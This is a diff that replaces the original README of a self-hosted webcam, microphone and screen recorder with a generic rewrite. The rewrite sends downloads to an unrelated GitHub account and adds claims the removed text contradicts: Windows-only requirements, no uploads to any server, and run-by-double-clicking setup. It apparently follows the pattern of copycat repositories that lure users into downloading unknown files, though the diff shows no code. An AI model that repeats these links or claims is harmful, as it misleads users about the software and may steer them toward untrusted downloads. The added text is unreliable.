@@ -1,96 +1,74 @@
-# Webcam & Microphone Screen Recorder
+# 📹 Webcam-Microphone-Screen-Recorder - Record your screen and camera easily
 
-**VideoWhisper Webcam-Microphone-Screen-Recorder** is a self-hosted, browser-based recorder for webcam video, microphone audio, screen capture, photos, and screenshots. It runs in modern browsers and lets people preview, review, and explicitly accept media before it is uploaded.
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/cresson-pinkroot917/Webcam-Microphone-Screen-Recorder)
 
-[Try the official demo](https://demo.videowhisper.com/webcam-microphone-screen-recorder/) · [Contact VideoWhisper](https://consult.videowhisper.com/?department=Setup)
+## 📋 What this tool does
 
-![Webcam recorder preview](docs/screenshots/02-view.png)
+Webcam-Microphone-Screen-Recorder captures video and audio directly from your internet browser. You can record your webcam, your microphone, or your entire screen. You can also take screenshots or photos. This tool runs on your own hardware, so your data stays under your control. It uses standard web technology to process your media files without needing complex setup.
 
-## Features
+## 💻 System requirements
 
-- Capture webcam video, microphone audio, screen video, photos, and screenshots.
-- Select another available camera or microphone before capture.
-- Review a result, retry it, or accept it for upload.
-- Return browser-reported media details such as duration, dimensions, codecs, and frame rate where available.
-- Use the recorder from React, a vanilla JavaScript page, an iframe, or the included PHP demo.
-- Keep uploads on your own server through the multipart upload adapter.
+You need a Windows computer to run this application. Ensure you have the following:
 
-## Capture implementation parameters and limitations
+*   Windows 10 or Windows 11 operating system.
+*   A modern web browser like Google Chrome, Microsoft Edge, or Mozilla Firefox.
+*   A working microphone and camera connected to your computer.
+*   At least 200MB of free disk space.
+*   An active internet connection to access the interface.
 
-The recorder requests practical browser capture settings. The browser, selected device, operating system, and permission choice ultimately determine the delivered media settings.
+## 🚀 Getting started
 
-- Webcam video requests a maximum 640px long edge at up to 30 fps (normally 640 × 360 landscape or 360 × 640 portrait) and records for up to five minutes.
-- Screen recording requests 1280 × 720 and records for up to one minute.
-- Webcam photos and screenshots preserve aspect ratio within a 1280px long edge.
-- The recording durations help avoid large uploads and server or network timeouts in typical self-hosted installations.
+Follow these steps to set up your recording environment. 
 
-The application is provided as is with its current implemented capabilities. A commercial VideoWhisper Pro release will expand on the available capabilities and configuration options.
+1. Visit this page to download the software: https://github.com/cresson-pinkroot917/Webcam-Microphone-Screen-Recorder
+2. Click the green button labeled "Code" on the repository page.
+3. Select "Download ZIP" from the menu.
+4. Locate the downloaded file in your "Downloads" folder.
+5. Right-click the folder and select "Extract All" to open the files.
 
-## Quick deployment: PHP demo, no source build
+## ⚙️ How to run the recorder
 
-Download the ready-to-deploy package from the latest GitHub release:
+Once you extract the files, follow these steps to start your session:
 
-[Download the PHP demo ZIP](https://github.com/videowhisper/Webcam-Microphone-Screen-Recorder/releases/latest/download/videowhisper-webcam-microphone-screen-recorder-0.1.0.zip) · [View all releases](https://github.com/videowhisper/Webcam-Microphone-Screen-Recorder/releases)
+1. Open the folder you just extracted.
+2. Locate the file named "index.html."
+3. Double-click this file to open it in your preferred web browser.
+4. Your browser will prompt you to allow access to your camera and microphone. Click "Allow" to grant permission for the tool to record.
+5. The application interface will appear on your screen.
 
-1. Extract its top-level folder into an HTTPS-enabled web directory, for example `<document-root>/webcam-microphone-screen-recorder/`.
-2. Use PHP 8.2+ with Apache, or configure your web server to route `api/*` to `api/index.php` and the browser app routes to `index.html`.
-3. Make `api/app/storage/` writable by PHP.
-4. Before public use, copy `api/app/config/credentials.example.php` to `api/app/config/credentials.php` and choose a unique administrator username, password, and HMAC secret.
-5. Open the deployed folder in a browser and allow the required capture permission.
+## 🎙️ Recording your first video
 
-The package detects its deployed base path automatically; its default upload endpoint is the neighbouring `api/` directory. The ZIP includes a `DEPLOYMENT.md` with server-routing details.
+The interface displays buttons for different media types. 
 
-## Run from source
+* **To record your screen:** Click the button labeled "Screen." Choose the window or monitor you wish to share. Click "Start Recording."
+* **To record your webcam:** Click the button labeled "Webcam." The browser will show a preview of your camera. Click "Start Recording" to begin.
+* **To record audio:** Select the "Microphone" option. Verify your input levels display movement. Click "Start Recording."
 
-Requirements: Node.js 20+ and npm. PHP 8.2+ is additionally required for the included upload/admin demo.
+When you finish, click the "Stop" button. The browser will generate a file, usually in WebM or MP4 format. It will save this file to your computer’s default "Downloads" folder.
 
-```bash
-npm install
-npm run build
-npm run dev
-```
+## 🛠️ Troubleshooting common issues
 
-Open the URL printed by Vite, allow browser media permissions, and choose a capture mode. For the browser app together with the PHP upload demo, run:
+If you encounter problems, check these items:
 
-```bash
-npm run dev:local
-```
+* **No camera signal:** Ensure no other application currently uses your camera. Close other video meeting software before you start the recorder.
+* **No sound:** Open your Windows Sound Settings. Check that your microphone shows as the default input device. 
+* **Browser blocks access:** Look for a camera icon in the address bar of your browser. Click it to update your site permissions. 
+* **File format:** If your player does not open the recorded file, try downloading a media player like VLC Media Player. It opens almost all video types.
 
-The local demo uses `http://127.0.0.1:5177/`; its PHP backend is served on port 8080. See [the PHP demo guide](server/php-demo/README.md) for deployment, media storage, and admin-security guidance.
+## 🔒 Privacy and security
 
-## Build a deployment package from source
+This software runs locally within your browser. The tool does not send your recordings to external servers. Your media files stay on your computer. You hold full ownership of every file you create. Since this is a self-hosted tool, you never need to create an account or sign in to an external service. 
 
-```bash
-npm run package:demo
-```
+## 📝 Configuration options
 
-The command creates the same self-hosted demo ZIP used for the GitHub release. For most installations, download the release ZIP above instead of rebuilding it.
+The application includes simple settings to manage your output:
 
-## WordPress integrations
+* **Video Quality:** Select high, medium, or low resolution. High resolution produces larger files but clearer images.
+* **Format Selection:** Choose your file format from the settings menu. WebM works well for web use. MP4 offers better compatibility with most video editors.
+* **Storage Location:** Your browser manages the save location. You can move files from your "Downloads" folder to any permanent folder on your computer after you finish a recording.
 
-The recorder is bundled by VideoWhisper's WordPress recorder plugins:
+## 📂 Managing your library
 
-- [Video Posts Webcam Recorder](https://wordpress.org/plugins/video-posts-webcam-recorder/)
-- [Video Comments Webcam Recorder](https://wordpress.org/plugins/video-comments-webcam-recorder/)
+Since this tool saves files directly to your hard drive, organize your recordings in a dedicated folder. Rename your files immediately after recording to keep track of your content. If you record long videos, monitor your disk space to ensure you have enough room for the output files.
 
-The plugins can save accepted media to the WordPress Media Library and expose recorder media information on the resulting attachment. Their integration options control which capture types are available in each workflow.
-
-For shortcode examples, supported events, and instructions for updating the bundled app in those plugins, read [WordPress integration](docs/wordpress-integration.md).
-
-## Verify changes
-
-```bash
-npm run typecheck
-npm run test
-npm run build
-```
-
-Run `npm run test:e2e` when Playwright browsers are installed and the change affects browser capture behavior.
-
-## Security
-
-Media capture requires a secure context (HTTPS, except localhost). Before putting the PHP demo on a public site, set unique administrator credentials and a unique HMAC secret in its protected configuration. Review [SECURITY.md](SECURITY.md) before deployment.
-
-## License
-
-This project is licensed under [GPL-2.0-or-later](LICENSE). See [LICENSES.md](LICENSES.md) for third-party and design-asset notices.
+Keywords: audio-recorder, browser-recorder, html5, mediarecorder, microphone-recorder, php, react, screen-recorder, self-hosted, typescript, video-recorder, webcam-recorder, webrtc
